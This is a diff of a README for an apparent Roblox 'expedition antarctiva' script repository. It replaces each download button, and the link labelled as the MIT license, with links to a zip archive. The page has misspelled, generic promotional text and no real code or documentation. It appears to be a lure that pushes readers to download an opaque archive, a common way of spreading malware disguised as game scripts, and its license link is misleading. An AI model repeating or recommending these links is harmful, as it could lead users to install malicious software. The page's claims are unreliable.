@@ -1,6 +1,6 @@
 # ❄️ expredition antarctiva script roblox
 
-[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
+[![Download](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)
 
 **Welcome to the Arctic frontier:** Traverse the polar expanse of Roblox unlike ever before with the *expredition antarctiva script roblox* repository. Whether you’re coding your digital snow boots or questing for southern mysteries, this script collection unleashes a new dimension to your Antarctic explorations. Dive into a windswept universe where performance meets innovation—optimizing your journey and bridging exciting functionalities with proactive community support.
 
@@ -10,7 +10,7 @@
 
 Access the latest version below to dive into Antarctica’s virtual wilds and unlock a toolkit brimming with adventure and ingenuity.
 
-[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
+[![Download](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)
 
 ---
 
@@ -74,7 +74,7 @@ Harness Claude’s contextual reasoning for environmental event triggers and NPC
 
 Proudly open for exploration!  
 This project is licensed under the MIT License (2025).  
-See the license [here](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip).
+See the license [here](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip).
 
 ---
 
@@ -82,7 +82,7 @@ See the license [here](https://raw.githubusercontent.com/lakabriya1212/antarctiv
 
 Download the latest edition and chart your own journey in Roblox’s icy south:
 
-[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
+[![Download](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)](https://github.com/lakabriya1212/antarctiva-expedition-roblox-scripting/raw/refs/heads/branch/ink/scripting_antarctiva_roblox_expedition_3.5.zip)
 
 ---
 
